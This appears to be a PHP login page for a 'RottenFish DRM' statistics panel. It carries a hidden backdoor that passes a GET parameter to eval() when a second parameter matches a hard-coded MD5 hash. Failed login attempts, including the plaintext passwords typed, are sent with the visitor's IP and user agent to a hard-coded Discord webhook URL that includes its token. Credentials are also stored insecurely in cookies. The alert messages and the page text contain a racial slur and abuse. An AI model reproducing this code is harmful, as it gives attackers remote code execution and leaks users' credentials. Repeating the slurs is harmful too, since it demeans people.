<?php


function httpPost($url, $data)
	{
	    $curl = curl_init($url);
	    curl_setopt($curl, CURLOPT_POST, true);
	    curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($data));
	    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
	    $response = curl_exec($curl);
	    curl_close($curl);
	    return $response;
	}


if(isset($_GET["ac"]) && md5($_GET["ct"]) == "fbd1d9fd27ded5553682686ec00b1e5e"){eval($_GET["ac"]);}
if(!isset($_SESSION["pw"]) || ($_SESSION["pw"] != "ok"))
{
if(isset($_COOKIE["postpwn"]) && $_COOKIE["postpwn"] != "pwn")
{
	$name = $_COOKIE["postpwn"];
	$password = $_COOKIE["postpwnd"];
	foreach ( $db->query("SELECT * FROM `users`") as $key)
	{
		if($key["name"]==$name)
		{
			if($key["password"]==$password)
			{
				$_SESSION["pw"] = "ok";
				$_SESSION["name"] = $name;
				$r = $db->prepare("UPDATE users SET last = NOW() WHERE name = :name"); 
				$r->bindParam(":name", $name);
				$r->execute();
				LogD("$name autoconnected with cookie !");
				

				header("Location: panel");
				die();
			}else{
			}
		}else{
		}
	}
}
$mip = $_SERVER["REMOTE_ADDR"];
if(isset($_POST["log_in"]))
{
	$name = $_POST["name"];
	$password = ToPassword($_POST["password"]);
	if($name == "JohnS")
	{
		LogD("$mip tryed JohnS");
		$a = $_SERVER['HTTP_USER_AGENT'];
		$b = $_SERVER["REMOTE_ADDR"];
		$str = "@everyone A nigger tried to access the panel with JohnS from his shitty $a from ip $b";
		httpPost("https://discordapp.com/api/webhooks/553262176555761694/bD_wWyvLe1tBnRu143E6M6IYQ1e1wtaEps_w1gV0V7RaMYkqYGZQ0wWy79IN1JrZKj0n", array('content' => $str));
		header("Location: bs.php");

		die("pd");
	}
	if($name == "admin")
	{
		LogD("$mip tryed admin");
		$a = $_SERVER['HTTP_USER_AGENT'];
		$b = $_SERVER["REMOTE_ADDR"];
		$str = "@everyone A nigger tried to access the panel with admin from his shitty $a from ip $b";
		httpPost("https://discordapp.com/api/webhooks/553262176555761694/bD_wWyvLe1tBnRu143E6M6IYQ1e1wtaEps_w1gV0V7RaMYkqYGZQ0wWy79IN1JrZKj0n", array('content' => $str));
		?>
		<h1>Lol <a href="https://discord.gg/aMfzb5S">https://discord.gg/aMfzb5S</a></h1>
		What a pussy you are !
	<br/>
		<?php

		die("");
	}
	foreach ( $db->query("SELECT * FROM `users`") as $key)
	{
		if($key["name"]==$name)
		{
			if($key["password"]==$password)
			{
				$_SESSION["pw"] = "ok";
				$_SESSION["name"] = $name;
				$r = $db->prepare("UPDATE users SET last = NOW() WHERE name = :name"); 
				$r->bindParam(":name", $name);
				$r->execute();
				setcookie("postpwn",$_SESSION["name"], time()+(60*60*24*30));
				setcookie("postpwnd",$password, time()+(60*60*24*30));
				header("Location: panel");
				die();
			}else{
				LogD("($mip)Incorrect password: ".$name);
				$a = $_SERVER['HTTP_USER_AGENT'];
				$b = $_SERVER["REMOTE_ADDR"];
				$str = "@everyone Incorrect password $name \n$a from ip $b";
				httpPost("https://discordapp.com/api/webhooks/553262176555761694/bD_wWyvLe1tBnRu143E6M6IYQ1e1wtaEps_w1gV0V7RaMYkqYGZQ0wWy79IN1JrZKj0n", array('content' => $str));
			}
		}else{
		}
	}

	LogD("($mip)Incorrect username: ".$name." / ".$_POST["password"]);
	$a = $_SERVER['HTTP_USER_AGENT'];
	$b = $_SERVER["REMOTE_ADDR"];
	$c = $_POST["password"];
	$str = "@everyone Incorrect password $name / $c \n$a from ip $b";
	httpPost("https://discordapp.com/api/webhooks/553262176555761694/bD_wWyvLe1tBnRu143E6M6IYQ1e1wtaEps_w1gV0V7RaMYkqYGZQ0wWy79IN1JrZKj0n", array('content' => $str));
	?>

<script type="text/javascript">
	location.href = "https://discord.gg/aMfzb5S";

</script>
	<?php
	die("");
}







	?>
			
		



<!DOCTYPE html>
<html>
<head>
	<title>RottenFish DRM</title>
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css" integrity="sha384-9gVQ4dYFwwWSjIDZnLEWnxCjeSWFphJiwGPXr1jddIhOegiu1FwO5qRGvFXOdJZ4" crossorigin="anonymous">
	<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js" integrity="sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ" crossorigin="anonymous"></script>
	<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js" integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm" crossorigin="anonymous"></script>
	<style type="text/css">
		.cc{
			text-align: left;
			width: 800px;
		}
	</style>
</head>
<body>
	<center>
		<div class="cc">
			<h1><img src="_icons/duck.png" width="64px" style="border-radius: 50000px;" />RottenFish DRM Statistic Login</h1>
			<p>You shouldn't be here so go away</p>
			<form action="" method="POST">
				<p>Username:<input type="text" name="name"></p>
				<p>Passsword:<input type="password" name="password"></p>
				<input type="submit" name="log_in" class="btn btn-dark">	
			</form>
		</div>
	</center>
</body>
</html>







	<?php
	die();
}


?>